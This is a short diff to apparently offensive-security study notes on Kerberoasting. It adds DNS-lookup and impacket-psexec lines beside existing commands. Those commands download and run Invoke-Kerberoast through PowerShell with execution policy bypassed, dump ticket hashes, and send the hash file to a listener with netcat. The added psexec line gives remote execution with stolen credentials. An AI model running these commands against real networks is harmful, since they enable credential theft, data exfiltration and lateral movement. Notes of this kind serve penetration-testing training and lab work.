@@ -93,6 +93,8 @@
 			
 			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
 			-  `WINDOWS: nc -nv 192.168.119.206 4444 < kerb0.txt ---- LINUX: nc -lvnp 4444 > hash.txt`
+			-  `powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')"`
+			-  `impacket-psexec username:password@IP`
 			
 		- [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
 
